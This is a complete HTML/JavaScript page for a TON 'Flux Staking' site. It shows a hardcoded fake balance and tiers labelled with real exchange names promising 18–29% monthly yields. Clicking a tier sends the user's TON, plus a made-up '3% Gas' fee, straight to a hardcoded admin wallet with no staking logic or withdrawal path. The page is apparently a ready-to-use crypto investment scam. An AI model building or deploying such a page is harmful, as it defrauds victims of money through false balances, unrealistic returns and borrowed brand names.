<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flux Staking</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #050508; color: white; font-family: sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); }
    </style>
</head>
<body>
    <div id="app" class="max-w-md mx-auto min-h-screen pb-24">
        <div class="flex justify-between items-center p-6 sticky top-0 bg-[#050508] z-50">
            <div class="font-black text-indigo-500">FLUX</div>
            <div id="ton-connect-button"></div>
        </div>

        <div class="text-center py-6">
            <p class="text-gray-500 text-xs uppercase tracking-widest">Total Balance</p>
            <h1 class="text-4xl font-bold my-2">$12,457.89</h1>
            <span class="text-green-400 text-xs font-bold bg-green-400/10 px-3 py-1 rounded-full">+$1,254.56 (+10.86%)</span>
        </div>

        <div class="px-6 space-y-3" id="tier-list">
            </div>
    </div>

    <script>
        const ADMIN_WALLET = "UQCcMrZZkHhi0rpjh_LL3E4AiTXICYTuBcqRpcJ-KKEt8bO1";
        
        // Initialize TON Connect
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://your-domain.com/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        const TIERS = [
            { name: 'Binance', min: 10, pnl: '18.5%', color: '#F3BA2F' },
            { name: 'Bitget', min: 100, pnl: '20.2%', color: '#00F0FF' },
            { name: 'OKX', min: 500, pnl: '22.8%', color: '#FFFFFF' },
            { name: 'MEXC', min: 2500, pnl: '25.5%', color: '#0052FF' },
            { name: 'KuCoin', min: 10000, pnl: '29.1%', color: '#24AE8F' }
        ];

        const tierList = document.getElementById('tier-list');
        TIERS.forEach(tier => {
            const div = document.createElement('div');
            div.className = 'glass p-4 rounded-2xl flex justify-between items-center cursor-pointer active:scale-95 transition-all';
            div.innerHTML = `
                <div class="flex items-center gap-4">
                    <div class="w-10 h-10 rounded-full flex items-center justify-center border font-bold" style="border-color: ${tier.color}; color: ${tier.color}">${tier.name[0]}</div>
                    <div>
                        <div class="font-bold text-sm">${tier.name}</div>
                        <div class="text-xs text-gray-500">Min $${tier.min}</div>
                    </div>
                </div>
                <div class="text-right">
                    <div class="text-green-400 font-bold">${tier.pnl}</div>
                    <div class="text-[9px] text-gray-600 uppercase">30D Yield</div>
                </div>
            `;
            div.onclick = () => handleStake(tier);
            tierList.appendChild(div);
        });

        async function handleStake(tier) {
            const totalAmount = tier.min * 1.03; // Including 3% Gas
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [{
                    address: ADMIN_WALLET,
                    amount: (totalAmount * 1000000000).toString(), // Convert to NanoTON
                    payload: "" // You can add a comment here
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("Staking Initialized! Countdown started.");
            } catch (e) {
                console.error(e);
            }
        }
    </script>
</body>
</html>
